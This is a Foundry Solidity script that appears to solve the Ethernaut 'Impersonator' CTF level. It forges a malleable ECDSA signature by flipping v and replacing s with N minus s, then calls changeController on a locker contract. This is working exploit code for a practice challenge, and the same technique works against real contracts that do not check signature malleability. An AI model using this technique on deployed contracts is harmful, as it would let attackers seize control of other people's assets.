// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/32-Impersonator.sol";


// contract Exploit {

// }

contract Exp is Script {
    Impersonator public ImpersonatorInstance = Impersonator(address(/*获取的实例地址*/));


    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");

    function attack() public {

        ECLocker locker = ImpersonatorInstance.lockers(0);

        uint8 v = 0x1b;
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;  // r 值
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;  // s 值

        bytes32 N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        

        uint8 newV = 27 + (1 - (v - 27));
        bytes32 newS = bytes32(uint256(N) - uint256(s));

        locker.changeController(newV, r, newS, address(0));
    }
    function run() external {
        vm.startBroadcast(hacker);

        attack();

        vm.stopBroadcast();
    }
}